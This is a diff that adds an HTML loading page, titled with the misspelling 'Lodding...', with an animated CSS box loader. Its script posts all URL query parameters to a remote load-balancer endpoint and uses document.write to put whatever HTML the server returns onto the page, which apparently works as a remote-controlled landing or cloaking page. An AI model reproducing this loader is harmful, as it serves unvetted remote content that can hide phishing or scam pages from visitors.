@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lodding...</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .loader-text {
+            font-size: 20px;
+            color: #888888;
+            margin-bottom: 20px;
+            font-weight: 300;
+            display: flex;
+        }
+        .dots {
+            display: inline-block;
+            width: 1em;
+            text-align: left;
+        }
+        .dots::after {
+            content: '......';
+            animation: dots 1.5s steps(6, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% {
+                content: '';
+            }
+            40% {
+                content: '.';
+            }
+            60% {
+                content: '..';
+            }
+            80% {
+                content: '...';
+            }
+            100% {
+                content: '......';
+            }
+        }
+        .loader {
+            --size: 32px;
+            --duration: 800ms;
+            width: 96px;
+            height: 64px;
+            margin: 0 auto;
+            transform-style: preserve-3d;
+            transform-origin: 50% 50%;
+            transform: rotateX(60deg) rotateZ(45deg) rotateY(0deg) translateZ(0px);
+            position: relative;
+        }
+        .loader .box {
+            width: 32px;
+            height: 32px;
+            transform-style: preserve-3d;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .loader .box:nth-child(1) {
+            transform: translate(100%, 0);
+            animation: box1 800ms linear infinite;
+        }
+        .loader .box:nth-child(2) {
+            transform: translate(0, 100%);
+            animation: box2 800ms linear infinite;
+        }
+        .loader .box:nth-child(3) {
+            transform: translate(100%, 100%);
+            animation: box3 800ms linear infinite;
+        }
+        .loader .box:nth-child(4) {
+            transform: translate(200%, 0);
+            animation: box4 800ms linear infinite;
+        }
+        .loader .box > div {
+            --translateZ: calc(var(--size) / 2);
+            --rotateY: 0deg;
+            --rotateX: 0deg;
+            background: #5c8df6;
+            width: 100%;
+            height: 100%;
+            transform: rotateY(var(--rotateY)) rotateX(var(--rotateX)) translateZ(var(--translateZ));
+            position: absolute;
+        }
+        .loader .box > div:nth-child(2) {
+            background: #145af2;
+            --rotateY: 90deg;
+        }
+        .loader .box > div:nth-child(3) {
+            background: #447cf5;
+            --rotateX: -90deg;
+        }
+        .loader .box > div:nth-child(4) {
+            background: #dbe3f4;
+            --translateZ: calc(var(--size) * 3 * -1);
+        }
+
+        @keyframes box1 {
+            0%, 50% {
+                transform: translate(100%, 0);
+            }
+            100% {
+                transform: translate(200%, 0);
+            }
+        }
+
+        @keyframes box2 {
+            0% {
+                transform: translate(0, 100%);
+            }
+            50% {
+                transform: translate(0, 0);
+            }
+            100% {
+                transform: translate(100%, 0);
+            }
+        }
+
+        @keyframes box3 {
+            0%, 50% {
+                transform: translate(100%, 100%);
+            }
+            100% {
+                transform: translate(0, 100%);
+            }
+        }
+        @keyframes box4 {
+            0% {
+                transform: translate(200%, 0);
+            }
+            50% {
+                transform: translate(200%, 100%);
+            }
+            100% {
+                transform: translate(100%, 100%);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;" id="msg"></div>
+    <div class="loader-text">Lodding<span class="dots"></span></div>
+    <div class="loader">
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="box">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <!--<script src="//cdn.bootcss.com/jquery/3.7.1/jquery.js"></script> -->
+    <!--<script src="//cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>  -->
+    <script src="https://s3.pstatp.com/cdn/expire-1-w/jquery/3.4.0/jquery.min.js"></script> 
+    <script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        var siteurl = 'https://nlb-96ra4gnuvarys0oylg.cn-heyuan.nlb.aliyuncsslb.com/';
+        var key = "";
+        function getAllParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramArray = [];
+    
+            params.forEach((value, key) => {
+                paramArray.push({ key, value });
+            });
+    
+            return paramArray; 
+        }
+        
+        function getLastTwoParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramArray = [];
+
+            params.forEach((value, key) => {
+                paramArray.push({ key, value });
+            });
+
+            let lastParam = paramArray[paramArray.length - 1];
+            let secondLastParam = paramArray[paramArray.length - 2];
+
+            return { lastParam, secondLastParam };
+        }
+
+        function sendRequest(lastParamValue, key, paramValue) {
+            $.post(siteurl + 'api.php/find', { lastParamValue, key, paramValue }, function (result) {
+                if (result.code == 200) {
+                    document.write(result.data.html);
+                } else {
+                    $('#msg').html(result.msg);
+                }
+            }, 'json')
+            .fail(function() {
+            });
+        }
+
+        $(function () {
+                const paramValue=getAllParams();
+                const { lastParam, secondLastParam } = getLastTwoParams();
+                 if (!lastParam ) {
+                     sendRequest("","");
+                }else{
+                    if (lastParam.key === 'key') {
+                        if (secondLastParam) {
+                             sendRequest(secondLastParam.value, lastParam.value,paramValue); 
+                        }
+                    } else {
+                        sendRequest(lastParam.value, key,paramValue);
+                    } 
+                }
+           
+        });
+    </script>
+</body>
+</html>
